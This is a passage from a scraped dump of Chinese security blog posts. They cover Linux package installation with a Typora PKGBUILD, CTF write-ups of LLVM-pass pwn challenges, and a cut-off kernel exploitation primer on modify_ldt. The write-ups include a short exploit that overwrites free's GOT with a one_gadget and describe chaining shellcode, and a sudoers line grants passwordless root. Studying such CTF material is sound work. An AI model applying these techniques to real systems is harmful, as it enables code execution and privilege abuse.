(0x00007fefa660c000)\tlibatk-bridge-2.0.so.0 =&gt; /usr/lib/libatk-bridge-2.0.so.0 (0x00007fefa65d4000)\tlibdbus-1.so.3 =&gt; /usr/lib/libdbus-1.so.3 (0x00007fefa6581000)\t......\n\n可以看到这里甚至于有依赖就在当前目录寻找了\n\n可以看到这里的文件其实也就包含了上面所需要的一部分依赖，其实这也是很多windows程序的思路，如果程序存在很多不常见到的依赖就会把依赖和程序捆绑起来进行安装。\n其实到这里大家都大概知道了包管理器在安装程序时到底是干了什么，其实就是将不同功能的程序放进了不同目录。\nAUR-PKGBUILD的编写一样拿typora举例\n# Maintainer: Jonas Bögle &lt;aur@iwr.sh&gt;# Contributor: Jonathan Duck &lt;duckbrain30@gmail.com&gt;_pkgname=typorapkgname=&quot;$_pkgname-free&quot;pkgver=0.11.18pkgrel=2pkgdesc=&quot;A minimal markdown editor and reader.&quot;arch=(&#x27;x86_64&#x27;)filename=&quot;typora_$&#123;pkgver&#125;_amd64.deb&quot;license=(&#x27;custom:&quot;Copyright (c) 2015 Abner Lee All Rights Reserved.&quot;&#x27;)url=&quot;https://typora.io/&quot;depends=(&#x27;gtk3&#x27; &#x27;libxss&#x27;)optdepends=(\t&#x27;noto-fonts-emoji: Or some other emoji font to see emojis&#x27;\t&#x27;pandoc: Import/export for extra file formats&#x27;)provides=(&quot;$_pkgname&quot;)conflicts=(&quot;$_pkgname&quot;)source=(&quot;https://typora.io/linux/$filename&quot;)sha512sums=(&#x27;8933cb4eab13a37719a3771d14a7a3f5951f6bbce06381ffe37ad5bc3029efed3878723427a4e97b83dbc1d7ccc43b31551b0c336663c843f0e685f8a4e2390e&#x27;)package() &#123;\tbsdtar -xf data.tar.xz -C &quot;$pkgdir/&quot;\trm -rf &quot;$pkgdir/usr/share/lintian/&quot;\tchmod 4755 &quot;$pkgdir/usr/share/typora/chrome-sandbox&quot;\t# Remove write permission for group/other\tchmod -R go-w &quot;$pkgdir/usr/share/typora/resources/node_modules&quot;\tsed -i &#x27;/Change Log/d&#x27; &quot;$pkgdir/usr/share/applications/typora.desktop&quot;\tfind &quot;$pkgdir&quot; -type d -exec chmod 755 &#123;&#125; \\;&#125;\n\n上面的名字，版本，架构什么就不说了，主要关注下面的内容。\n首先是这里source，很明显就是再往上的这个文件的deb包，下面sha512sums就是检验码。\nsrcdir\n​    makepkg将会把源文件解压到此文件夹或在此文件夹中生成指向 PKGBUILD 里 source 数组中文件的软连接。\npkgdir\n​    makepkg会把该文件夹当成系统根目录，并将软件安装在此文件夹下。\n重点就是下面的打包函数，可以看到首先是解压了data.tar.xz这个包带pkgdir。后面就是删除个东西，然后改变权限(可以看到typora是Electron)，下面就是创建图标，最后就是修改pkgdir下目录的权限为755。\n关于aur的更多可以看archwiki\nsudo免密码这个是我每次装完系统必干的一件事情，不过经常忘，而且网上的很多东西都不能实现。所以这里自己记录一下\nroot ALL=(ALL:ALL) ALLyour_username ALL=(ALL) NOPASSWD: ALL\n\n删除/etc/sudoers.d/10-installer\n总结其实程序的安装并没有我以前想象的那么复杂，至少对于linux来说是这样的。如果遇到什么有趣的linux操作我也会及时分享。\n","categories":["搞机"],"tags":["deb","aur"]},{"title":"llvm pass pwn","url":"/2022/07/27/llvm-pass-pwn/","content":"简要介绍首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：\nLLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本。\nLLVM PASS是什么：pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果\n\n首先我们的源代码会被clang编译器编译成一种中间代码——IR，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。\nLLVM IRLLVM的IR的三种存在形式：\n\n内存格式，只保存在内存中，人无法看到\n不可读的IR，被称作bitcode，文件后缀为bc\n可读的IR，介于高级语言和汇编代码之间，文件后缀为ll\n\n大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。\n从对应格式转化到另一格式的命令：\n.c  =&gt; .ll: clang -emit-llvm -S a.c -o a.ll.c  =&gt; .bc: clang -emit-llvm -c a.c -o a.bc.ll =&gt; .bc: llvm-as a.ll -o a.bc.bc =&gt; .ll: llvm-dis a.bc -o a.ll.bc =&gt; .s : llc a.bc -o a.s\n\n首先呢，写一个简单的c语言程序：\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;   char name[0x10];   read(0,name,0x10);   write(1,name,0x10);   printf(&quot;wow\\n&quot;);&#125;\n\n通过上面所给的指令\nclang -emit-llvm -S test.c -o test.ll\n\n获得如下内容：\n; ModuleID = &#x27;test.c&#x27;target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;target triple = &quot;x86_64-pc-linux-gnu&quot;@.str = private unnamed_addr constant [5 x i8] c&quot;wow\\0A\\00&quot;, align 1; Function Attrs: nounwind uwtabledefine i32 @main() #0 &#123;  %name = alloca [16 x i8], align 16  %1 = getelementptr inbounds [16 x i8], [16 x i8]* %name, i32 0, i32 0  %2 = call i64 @read(i32 0, i8* %1, i64 16)  %3 = getelementptr inbounds [16 x i8], [16 x i8]* %name, i32 0, i32 0  %4 = call i64 @write(i32 1, i8* %3, i64 16)  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0))  ret i32 0&#125;declare i64 @read(i32, i8*, i64) #1declare i64 @write(i32, i8*, i64) #1declare i32 @printf(i8*, ...) #1attributes #0 = &#123; nounwind uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;attributes #1 = &#123; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;!llvm.ident = !&#123;!0&#125;!0 = !&#123;!&quot;clang version 3.8.0-2ubuntu4 (tags/RELEASE_380/final)&quot;&#125;\n\n可以看见中间无论是申请变量还是调用函数还是可以很清晰的看出来的。\nLLVM PASS官方文档的一个实例：\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());  &#125;);\n\n该示例用于遍历IR中的函数，因此结构体Hello继承了FunctionPass，并重写了runOnFunction函数，那么每遍历到一个函数时，runOnFunction都会被调用，因此该程序会输出函数名。我们需要将其编译为模块\nclang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared test.cpp -o test.so `llvm-config --ldflags`\n\ntcdy@ubuntu:~$ opt -load ./test.so -hello ./test.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: main\n\n上面以我们刚刚的IR为例，-hellow是注册的名字\nstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);\n\n最后打印出来函数名字\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();      for(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)&#123;         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();         for(; instIter != instEnd; ++instIter)&#123;            errs() &lt;&lt; &quot;opcode=&quot; &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; &quot; NumOperands=&quot; &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; &quot;\\n&quot;;         &#125;      &#125;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());&#125;);\n\n现在在刚刚的基础上对函数的代码进行遍历操作\ntcdy@ubuntu:~$ opt -load ./test.so -hello ./test.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: mainopcode=alloca NumOperands=1opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=call NumOperands=2opcode=ret NumOperands=1\n\n最后可以看到拿到了函数中的指令操作\nLLVM PASS逆向分析一般来说LLVM PASS pwn都是对函数进行PASS操作，所以我们首先要找到runOnFunction函数时如何重写的\n\n一般来说runOnFunction都会在函数表的最下面\n2021 redhat simpleVM首先找到上面所述的函数：\n__int64 __fastcall sub_6830(__int64 a1, llvm::Value *a2)&#123;  __int64 v2; // rdx  bool v4; // [rsp+7h] [rbp-119h]  size_t v5; // [rsp+10h] [rbp-110h]  const void *Name; // [rsp+28h] [rbp-F8h]  __int64 v7; // [rsp+30h] [rbp-F0h]  int v8; // [rsp+94h] [rbp-8Ch]  Name = (const void *)llvm::Value::getName(a2);  v7 = v2;  if ( &quot;o0o0o0o0&quot; )    v5 = strlen(&quot;o0o0o0o0&quot;);  else    v5 = 0LL;  v4 = 0;  if ( v7 == v5 )  &#123;    if ( v5 )      v8 = memcmp(Name, &quot;o0o0o0o0&quot;, v5);    else      v8 = 0;    v4 = v8 == 0;  &#125;  if ( v4 )    sub_6AC0(a1, a2);  return 0LL;&#125;\n\n可以看到这里验证的是函数名是否为o0o0o0o0然后进入：\nunsigned __int64 __fastcall sub_6AC0(__int64 a1, llvm::Function *a2)&#123;  llvm::BasicBlock *v3; // [rsp+20h] [rbp-30h]  __int64 v4; // [rsp+38h] [rbp-18h] BYREF  __int64 v5[2]; // [rsp+40h] [rbp-10h] BYREF  v5[1] = __readfsqword(0x28u);  v5[0] = llvm::Function::begin(a2);  while ( 1 )  &#123;    v4 = llvm::Function::end(a2);    if ( (llvm::operator!=(v5, &amp;v4) &amp; 1) == 0 )      break;    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);    sub_6B80(a1, v3);    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator++(      v5,      0LL);  &#125;  return __readfsqword(0x28u);&#125;\n\n这里则是遍历函数中的每一个basicblock，取出之后进入sub_6b80函数进一步处理\nv39[1] = __readfsqword(0x28u);v39[0] = llvm::BasicBlock::begin(a2);while ( 1 )&#123;    v38 = llvm::BasicBlock::end(a2);    if ( (llvm::operator!=(v39, &amp;v38) &amp; 1) == 0 )        break;    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,false&gt;&gt;(v39);    if ( (unsigned int)llvm::Instruction::getOpcode(v36) == 0x37 )    &#123;        v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);        if ( v35 )        &#123;            s1 = (char *)malloc(0x20uLL);            CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);            Name = (_QWORD *)llvm::Value::getName(CalledFunction);            *(_QWORD *)s1 = *Name;            *((_QWORD *)s1 + 1) = Name[1];            *((_QWORD *)s1 + 2) = Name[2];            *((_QWORD *)s1 + 3) = Name[3];\n\n这里呢则是遍历basicblock中的每一个操作指令，后续就是类似于vm-pwn中对相应的指令做相应的处理。这里重点关注三段代码即可：\nelse if ( !strcmp(s1, &quot;store&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )    &#123;        v25 = llvm::CallBase::getArgOperand(v35, 0);        v24 = 0LL;        v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);        if ( v23 )        &#123;            v22 = llvm::ConstantInt::getZExtValue(v23);            if ( v22 == 1 )                v24 = REG1;            if ( v22 == 2 )                v24 = REG2;        &#125;        if ( v24 == REG1 )        &#123;            **(_QWORD **)REG1 = *(_QWORD *)REG2;        &#125;        else if ( v24 == REG2 )        &#123;            **(_QWORD **)REG2 = *(_QWORD *)REG1;        &#125;    &#125;&#125;\n\n这里可以看到指令为store时，通过第一个参数来决定下面是什么寄存器来进行赋值，如果我们可以操控寄存器也就可以实现任意地址写了。\nelse if ( !strcmp(s1, &quot;load&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )    &#123;        v21 = llvm::CallBase::getArgOperand(v35, 0);        v20 = 0LL;        v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);        if ( v19 )        &#123;            v18 = llvm::ConstantInt::getZExtValue(v19);            if ( v18 == 1 )                v20 = REG1;            if ( v18 == 2 )                v20 = REG2;        &#125;        if ( v20 == REG1 )            *(_QWORD *)REG2 = **(_QWORD **)REG1;        if ( v20 == REG2 )            *(_QWORD *)REG1 = **(_QWORD **)REG2;    &#125;&#125;\n\n根据上面同理，如果可以操控寄存器就可以任意地址读了\nelse if ( !strcmp(s1, &quot;add&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )    &#123;        v17 = llvm::CallBase::getArgOperand(v35, 0);        v16 = 0LL;        v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);        if ( v15 )        &#123;            v14 = llvm::ConstantInt::getZExtValue(v15);            if ( v14 == 1 )                v16 = REG1;            if ( v14 == 2 )                v16 = REG2;        &#125;        if ( v16 )        &#123;            v13 = llvm::CallBase::getArgOperand(v35, 1u);            v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);            if ( v12 )                *v16 += llvm::ConstantInt::getZExtValue(v12);        &#125;    &#125;&#125;\n\n这里我们就可以控制寄存器了\n可以在上面看到，这里的指令是放在malloc出来的堆块上面的，并且程序的循环最后会free掉堆块，那么我们的思路就是修改free的got表为one_gadget\nexp:\nvoid store(int a);void load(int a);void add(int a, int b); void o0o0o0o0()&#123;    add(1, 0x77e100);    load(1);    add(2, 0x729ec);    store(1);&#125;\n\nSatool## IntroductionA LLVM Pass that can optimize add/sub instructions.## How to runopt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S## Example### IR before optimization```define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;  %2 = sub nsw i64 %0, 2  %3 = add nsw i64 %2, 68  %4 = add nsw i64 %0, 6  %5 = add nsw i64 %4, -204  %6 = add nsw i64 %5, %3  ret i64 %6&#125;```### IR after optimization```define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;  %2 = mul i64 %0, 2  %3 = add i64 %2, -132  ret i64 %3&#125;```\n\n首先看题目的readme文件，可以从before和after的对比看出来这里做的是压缩优化IR指令，并且限制了只能是sub或者add或者ret\n\n可以看到这道题的runOnFunction更是直接给了出来\nv30 = this;v29 = a2;v28 = 0;v2 = a2;if ( llvm::Function::arg_size(a2) != 1 || (v2 = v29, llvm::Function::size(v29) != 1) )&#123;    v3 = llvm::errs(v2);    llvm::raw_ostream::operator&lt;&lt;(v3, &quot;Function has more than one argument or basicblock\\n&quot;);    exit(-1);&#125;this[5] = this[4];mprotect(this[4], 0x1000uLL, 3);`anonymous namespace&#x27;::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);    mprotect(this[4], 0x1000uLL, 5);v27 = `anonymous namespace&#x27;::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);\n\n可以看到函数的开始验证了参数和基本块只允许有一个，然后通过handle函数之后执行callCode函数，并且在handle处理之前内存的权限为可读可写，随后改为了可读可执行。\n__int64 __fastcall `anonymous namespace&#x27;::MBAPass::callCode(        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),        __int64 a2)&#123;  return this[4]((_anonymous_namespace_::MBAPass *)this, a2);&#125;\n\n可以看到callCode函数是将this[4]直接执行，那么意思很明显就是写shellcode。所以重点还是需要看handle函数\nv32 = this;v31 = a2;v30 = *((_QWORD *)this + 4) + 0xFF0LL;v29 = (llvm::BasicBlock *)llvm::Function::front(a2);Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);Operand = llvm::User::getOperand(Terminator, 0);if ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; 1) != 0 )&#123;    *((_DWORD *)this + 12) = 0;    v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);    SExtValue = llvm::ConstantInt::getSExtValue(v2);    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, SExtValue);        return `anonymous namespace&#x27;::MBAPass::writeRet(this);&#125;else if ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;((__int64)&amp;Operand) &amp; 1) != 0 )&#123;    *((_DWORD *)this + 12) = 1;    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, 0LL);        return `anonymous namespace&#x27;::MBAPass::writeRet(this);&#125;else&#123;    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, 0LL);        *((_DWORD *)this + 12) = 0;    std::stack&lt;llvm::Value *&gt;::stack&lt;std::deque&lt;llvm::Value *&gt;,void&gt;(v26);    std::stack&lt;int&gt;::stack&lt;std::deque&lt;int&gt;,void&gt;(v25);    std::stack&lt;llvm::Value *&gt;::push(v26, &amp;Operand);    v24 = 1;    std::stack&lt;int&gt;::push(v25, &amp;v24);    while ( *((_QWORD *)this + 5) &lt; v30 )    &#123;        if ( !std::stack&lt;llvm::Value *&gt;::size(v26) )        &#123;            `anonymous namespace&#x27;::MBAPass::writeRet(this);                break;        &#125;\n\n并且这里根据handle的处理可以看出来是将v30当作结束地址，再看一下比较重要的几个函数\n_anonymous_namespace_::MBAPass *__fastcall `anonymous namespace&#x27;::MBAPass::writeMovImm64(        _anonymous_namespace_::MBAPass *this,        int a2,        __int64 a3)&#123;  _anonymous_namespace_::MBAPass *result; // rax  **((_BYTE **)this + 5) = 0x48;  if ( a2 )    *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xBB;  else    *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xB8;  result = this;  *(_QWORD *)(*((_QWORD *)this + 5) + 2LL) = a3;  *((_QWORD *)this + 5) += 10LL;  return result;&#125;\n\n可以看到这里其实就是写shellcode\n&gt;&gt;&gt; test=b&#x27;\\x48\\xbb\\xfe\\xdc\\xba\\x98\\x76\\x54\\x32\\x10&#x27;&gt;&gt;&gt; disasm(test)&#x27;   0:   48 bb fe dc ba 98 76 54 32 10   movabs rbx, 0x1032547698badcfe&#x27;&gt;&gt;&gt;\n\n但是这里的漏洞点是在handle函数中将this[4]+0xff0当作了结束的位置，所以还存在0x10是我们可写的，所以我们通过借位的思想来书写shellcode\n在正常情况下执行：\n\n我们是可以顺利执行结束的\n那如果第二次我们的指令刚好到达0xff0执行完毕就会出现以下情况：\n\n 这里就会接着跳转回去，随后我们每次可控的内容只有八个字节，所以后续就是分片的思想通过jmp指令连接起我们的shellcode\n讲两句：这司马难度的shellcode确定是想我们比赛的时候来做吗？\nexp略长，需要的 https://github.com/196082/196082 自取\n\n参考链接：https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3\n","categories":["pwn"],"tags":["llvm pass"]},{"title":"modify_ldt利用","url":"/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/","content":"在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？\n利用原理linux存在这样一个系统调用叫做modify_ldt，我们可以通过他获取或者修改当前进程的LDT\nSYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,                unsigned long , bytecount)&#123;    int ret = -ENOSYS;    switch (func) &#123;        case 0:            ret = read_ldt(ptr, bytecount);            break;        case 1:            ret = write_ldt(ptr, bytecount, 1);            break;        case 2:            ret = read_default_ldt(ptr, bytecount);            break;        case 0x11:            ret = write_ldt(ptr, bytecount, 0);            break;    &#125;    /*     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;     * return type, but tht ABI for sys_modify_ldt() expects     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax     * for the return code.  The &#x27;unsigned&#x27; is necessary so     * the compiler does not try to sign-extend the negative     * return codes into the high half of the register when     * taking the value from int-&gt;long.     */    return (unsigned int)ret;&#125;\n\n可以看到这里传入的参数有三个，分别是func，ptr，bytecount，其中ptr指针应该指向的是user_desc结构体\nstruct user_desc &#123;    unsigned int  entry_number;    unsigned int  base_addr;    unsigned int  limit;    unsigned int  seg_32bit:1;    unsigned int  contents:2;    unsigned int  read_exec_only:1;    unsigned int  limit_in_pages:1;    unsigned int  seg_not_present:1;    unsigned int  useable:1;&#125;;\n\nstatic int read_ldt(void __user *ptr, unsigned long bytecount)&#123;    struct mm_struct *mm = current-&gt;mm;    unsigned long entries_size;    int retval;    down_read(&amp;mm-&gt;context.ldt_usr_sem);    if (!mm-&gt;context.ldt) &#123;        retval = 0;        goto out_unlock;    &#125;    if (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)        bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;    if (entries_size &gt; bytecount)        entries_size = bytecount;    if (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;        retval = -EFAULT;        goto out_unlock;    &#125;    if (entries_size != bytecount) &#123;        /* Zero-fill the rest and pretend we read bytecount bytes. */        if (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;            retval = -EFAULT;            goto out_unlock;        &#125;    &#125;    retval = bytecount;    out_unlock:    up_read(&amp;mm-&gt;context.ldt_usr_sem);    return retval;&#125;\n\n在read_ldt函数中可以看到这里有一个copy_to_user函数，可以看到如果我们可以控制mm-&gt;context.ldt-&gt;entries那我们即可实现任意地址的读取\nstatic int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)&#123;    struct mm_struct *mm = current-&gt;mm;    struct ldt_struct *new_ldt, *old_ldt;    unsigned int old_nr_entries, new_nr_entries;    struct user_desc ldt_info;    struct desc_struct ldt;    int error;    error = -EINVAL;    if (bytecount != sizeof(ldt_info))        goto out;    error = -EFAULT;    if (copy_from_user(&amp;ldt_info, ptr, sizeof(ldt_info)))        goto out;    error = -EINVAL;    if (ldt_info.entry_number &gt;= LDT_ENTRIES)        goto out;    if (ldt_info.contents == 3) &#123;        if (oldmode)            goto out;        if (ldt_info.seg_not_present == 0)            goto out;    &#125;    if ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||        LDT_empty(&amp;ldt_info)) &#123;        /* The user wants to clear the entry. */        memset(&amp;ldt, 0, sizeof(ldt));    &#125; else &#123;        if (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;            error = -EINVAL;            goto out;        &#125;        fill_ldt(&amp;ldt, &amp;ldt_info);        if (oldmode)            ldt.avl = 0;    &#125;    if (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))        return -EINTR;    old_ldt       = mm-&gt;context.ldt;    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : 0;    new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);    error = -ENOMEM;    new_ldt = alloc_ldt_struct(new_nr_entries);    if (!new_ldt)        goto out_unlock;    if (old_ldt)        memcpy(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;    finalize_ldt_struct(new_ldt);    /*\t * If we are using PTI, map the new LDT into the userspace pagetables.\t * If there is already an LDT, use the other slot so that other CPUs\t * will continue to use the old LDT until install_ldt() switches\t * them over to the new LDT.\t */    error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : 0);    if (error) &#123;        /*\t\t * This only can fail for the first LDT setup. If an LDT is\t\t * already installed then the PTE page is already\t\t * populated. Mop up a half populated page table.\t\t */        if (!WARN_ON_ONCE(old_ldt))            free_ldt_pgtables(mm);        free_ldt_struct(new_ldt);        goto out_unlock;    &#125;    install_ldt(mm, new_ldt);    unmap_ldt_struct(mm, old_ldt);    free_ldt_struct(old_ldt);    error = 0;    out_unlock:    up_write(&amp;mm-&gt;context.ldt_usr_sem);    out:    return error;&#125;\n\n可以看到最后会将新的ldt放到mm中，然后释放掉旧的ldt，这里主要需要注意的是如何生存一个新的ldt，可以看到是调用了alloc_ldt_struct函数\nstatic struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)&#123;    struct ldt_struct *new_ldt;    unsigned int alloc_size;    if (num_entries &gt; LDT_ENTRIES)        return NULL;    new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);    if (!new_ldt)        return NULL;    BUILD_BUG_ON(LDT_ENTRY_SIZE != sizeof(struct desc_struct));    alloc_size = num_entries * LDT_ENTRY_SIZE;    /*\t * Xen is very picky: it requires a page-aligned LDT that has no\t * trailing nonzero bytes in any page that contains LDT descriptors.\t * Keep it simple: zero the whole allocation and never allocate less\t * than PAGE_SIZE.\t */    if (alloc_size &gt; PAGE_SIZE)        new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);    else        new_ldt-&gt;entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);    if (!new_ldt-&gt;entries) &#123;        kfree(new_ldt);        return NULL;    &#125;    /* The new LDT isn&#x27;t aliased for PTI yet. */    new_ldt-&gt;slot = -1;    new_ldt-&gt;nr_entries = num_entries;    return new_ldt;&#125;\n\n可以看到这里，kmalloc一个ldt_struct的size\nstruct ldt_struct &#123;    /*\t * Xen requires page-aligned LDTs with special permissions.  This is\t * needed to prevent us from installing evil descriptors such as\t * call gates.  On native, we could merge the ldt_struct and LDT\t * allocations, but it&#x27;s not worth trying to optimize.\t */    struct desc_struct\t*entries;    unsigned int\t\tnr_entries;    /*\t * If PTI is in use, then the entries array is not mapped while we&#x27;re\t * in user mode.  The whole array will be aliased at the addressed\t * given by ldt_slot_va(slot).  We use two slots so that we can allocate\t * and map, and enable a new LDT without invalidating the mapping\t * of an older, still-in-use LDT.\t *\t * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.\t */    